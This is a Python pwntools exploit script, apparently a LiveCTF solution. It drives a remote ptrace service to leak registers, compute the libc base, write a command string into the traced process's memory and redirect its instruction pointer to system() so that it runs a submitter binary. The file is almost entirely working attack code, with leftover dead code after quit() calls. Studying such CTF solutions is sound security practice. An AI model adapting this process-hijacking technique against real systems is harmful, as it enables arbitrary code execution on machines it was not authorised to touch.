#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


PTRACE_TRACEME=0
PTRACE_PEEKTEXT=1
PTRACE_PEEKDATA=2
PTRACE_PEEKUSR=3
PTRACE_POKETEXT=4
PTRACE_POKEDATA=5
PTRACE_POKEUSR=6
PTRACE_CONT=7
PTRACE_KILL=8
PTRACE_SINGLESTEP=9
PTRACE_ATTACH=16
PTRACE_DETACH=17
PTRACE_SYSCALL=24

REGISTERS=["r15", "r14", "r13", "r12", "rbp", "rbx", "r11", "r10", "r9", "r8", "rax", "rcx", "rdx", "rsi", "rdi", "orig_rax", "rip", "cs", "eflags", "rsp", "ss", "fs_base", "gs_base", "ds", "es", "fs", "gs"]

io = remote(HOST, int(PORT))

def do_ptrace(request, address, data, another=True):
    io.readline() # What ptrace request do you want to send?
    io.sendline(hex(request))
    io.readline() # What address do you want?
    io.sendline(hex(address))
    io.readline() # What do you want copied into data?
    io.sendline(hex(data))
    result = io.readline()
    io.readline() # Do another (0/1)?
    if another:
        io.sendline(hex(1))
    else:
        io.sendline(hex(0))
    result = int(result.rstrip().split(b" ")[2], 16)
    return result

for _ in range(2):
    result = do_ptrace(PTRACE_SYSCALL, 0, 0)
    rdi = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rdi")*8, 0)
    print(f"rdi: {rdi:x}")
    rsp = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rsp")*8, 0)
    print(f"rsp: {rsp:x}")
    rip = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rip")*8, 0)
    print(f"rip: {rip:x}")
libc_base = rip - 0xeac02
print(f"libc_base: {libc_base:x}")

libc = ELF("/libc.so.6")
libc.address = libc_base
system = libc.symbols["system"]

print(f"system: {system:x}")

command="/home/livectf/submitter\x00"
command = command + "\x00"*8
print(len(command))
for i in range(int(len(command) / 8)):
    result = do_ptrace(PTRACE_POKEDATA, rdi+i*8, u64(command[i*8:(i+1)*8]))
    print(result)
#result = do_ptrace(PTRACE_POKEDATA, rdi, rdi+8)
print(result)

result = do_ptrace(PTRACE_POKEUSR, REGISTERS.index("rip")*8, system)
print(f"pokeusr rip: {result:x}")

for i in range(6):
    result = do_ptrace(PTRACE_PEEKDATA, rdi+i*8, 0)
    print(f"on {rdi+i*8:x}: {result:x}")

rdi = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rdi")*8, 0)
print(f"rdi: {rdi:x}")
rsp = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rsp")*8, 0)
print(f"rsp: {rsp:x}")
rip = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rip")*8, 0)
print(f"rip: {rip:x}")

result = do_ptrace(PTRACE_CONT, 0, 0)
print(result)
print(io.recvline())
print(io.recvline())

#rip = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rip")*8, 0) - libc_base
#print(f"rip: {rip:x}")

#print(io.recvall())
quit()




while True:
    result = do_ptrace(PTRACE_SINGLESTEP, 0, 0)
    print(result)
    rip = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rip")*8, 0) - libc_base
    print(f"rip: {rip:x}")
#    if rip == 0xea7dd: # ret
#        break


rsp = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rsp")*8, 0) - libc_base
print(f"rsp: {rsp:x}")
#result = do_ptrace(PTRACE_PEEKDATA, rsp, 0)
#print(f"result: {result:x}")
#rsp = do_ptrace(PTRACE_POKEDATA, rsp, system)

#while True:
#    result = do_ptrace(PTRACE_SINGLESTEP, 0, 0)
#    print(result)
#    rip = do_ptrace(PTRACE_PEEKUSR, REGISTERS.index("rip")*8, 0) - libc_base
#    print(f"rip: {rip:x}")


result = do_ptrace(PTRACE_CONT, 0, 0)
print(result)
result = do_ptrace(PTRACE_DETACH, 0, 0)
print(result)
print(io.recvline())
quit()


    
result = do_ptrace(PTRACE_SYSCALL, 0, 0)
print(hex(result))

for index, r in enumerate(REGISTERS):
    result = do_ptrace(PTRACE_PEEKUSR, index*8, 0)
    print(f"{r}: {result:x}")
#io.interactive()
